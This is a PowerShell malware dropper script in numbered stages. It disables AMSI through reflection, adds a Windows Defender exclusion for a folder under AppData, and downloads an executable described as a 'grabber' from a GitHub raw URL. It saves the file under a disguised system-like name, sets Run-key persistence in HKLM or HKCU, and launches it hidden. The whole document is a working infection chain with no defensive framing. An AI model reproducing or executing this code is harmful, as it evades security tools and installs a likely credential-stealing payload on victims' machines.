# 1. AMSI Bypass
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b;break}}
$d=$c.GetField("amsiInitFailed","NonPublic,Static");$d.SetValue($null,$true)

# 2. Payload Delivery Configuration
$baseDir = "$env:APPDATA\Microsoft\Windows\Templates"
$grabberUrl = "https://github.com/ashleywilmer7-star/trimiez/raw/refs/heads/main/combined.exe"
$HKLM = [uint32]2147483650
$wmi = [WMIClass]"root\default:StdRegProv"

# 3. Prep and Exclude
if (!(Test-Path $baseDir)) { 
    New-Item -Path $baseDir -Force -ItemType Directory | Out-Null
}
# Add exclusion via powershell to avoid interference
powershell -Command "Add-MpPreference -ExclusionPath '$baseDir'"

# 4. Download Binary
$wc = New-Object Net.WebClient
$wc.DownloadFile($grabberUrl, "$baseDir\sys_sync.exe")

# 5. Persistence (HKLM Run Key)
try {
    $runPath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
    $wmi.CreateKey($HKLM, $runPath)
    $wmi.SetStringValue($HKLM, $runPath, "SystemSync", "$baseDir\sys_sync.exe")
} catch {
    # If HKLM fails (no admin), try HKCU as backup
    $HKCU = [uint32]2147483649
    $wmi.CreateKey($HKCU, $runPath)
    $wmi.SetStringValue($HKCU, $runPath, "SystemSync", "$baseDir\sys_sync.exe")
}

# 6. Execute Payload
Start-Process "$baseDir\sys_sync.exe" -WindowStyle Hidden
